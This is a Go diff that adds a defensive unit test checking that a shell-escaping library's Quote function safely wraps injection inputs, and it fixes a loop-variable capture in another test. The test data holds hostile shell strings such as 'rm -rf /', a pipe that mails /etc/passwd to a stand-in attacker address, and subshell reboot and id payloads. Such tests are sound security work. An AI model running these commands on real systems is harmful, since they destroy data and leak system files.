@@ -59,6 +59,44 @@ func TestAllInvalid(t *testing.T) {
 	assertEqual(t, s, expected)
 }
 
+func TestSecurityAdversarialPayloads(t *testing.T) {
+	tests := []struct {
+		name     string
+		input    string
+		expected string
+	}{
+		{"empty string", "", "''"},
+		{"command separator semicolon", "; rm -rf / ;", "'; rm -rf / ;'"},
+		{"command separator AND", "foo && bar", "'foo && bar'"},
+		{"command separator OR", "foo || bar", "'foo || bar'"},
+		{"pipe operator", "cat /etc/passwd | mail bad@actor.com", "'cat /etc/passwd | mail bad@actor.com'"},
+		{"subshell dollar parens", "$(reboot)", "'$(reboot)'"},
+		{"subshell backticks", "`id`", "'`id`'"},
+		{"nested subshell", "`echo $(whoami)`", "'`echo $(whoami)`'"},
+		{"variable expansion simple", "$PATH", "'$PATH'"},
+		{"variable expansion braced", "${HOME}", "'${HOME}'"},
+		{"single quote alone", "'", `''"'"''`},
+		{"triple single quotes", "'''", `''"'"''"'"''"'"''`},
+		{"nested single quotes in text", "don't say 'never'", `'don'"'"'t say '"'"'never'"'"''`},
+		{"double quotes in text", `"quoted"`, `'"quoted"'`},
+		{"mixed quotes", `'\"'`, `''"'"'\"'"'"''`},
+		{"newlines and tabs", "foo\nbar\tbaz", "'foo\nbar\tbaz'"},
+		{"wildcards and globs", "* ? [a-z] {1..10}", "'* ? [a-z] {1..10}'"},
+		{"redirection", "> /dev/null 2>&1", "'> /dev/null 2>&1'"},
+		{"process substitution", "<(ls -la)", "'<(ls -la)'"},
+		{"backslash paths", `C:\Program Files\App\`, `'C:\Program Files\App\'`},
+		{"multibyte utf8", "こんにちは世界 🚀", "'こんにちは世界 🚀'"},
+	}
+
+	for _, tt := range tests {
+		tt := tt
+		t.Run(tt.name, func(t *testing.T) {
+			got := shellescape.Quote(tt.input)
+			assertEqual(t, got, tt.expected)
+		})
+	}
+}
+
 func TestCleanString(t *testing.T) {
 	s := shellescape.Quote("foo.example.com")
 	expected := `foo.example.com`
@@ -108,6 +146,7 @@ func TestStripSpaces(t *testing.T) {
 		{"only spaces", args{"   "}, ""},
 	}
 	for _, tt := range tests {
+		tt := tt
 		t.Run(tt.name, func(t2 *testing.T) {
 			t2.Parallel()
 			got := shellescape.StripSpaces(tt.args.s)
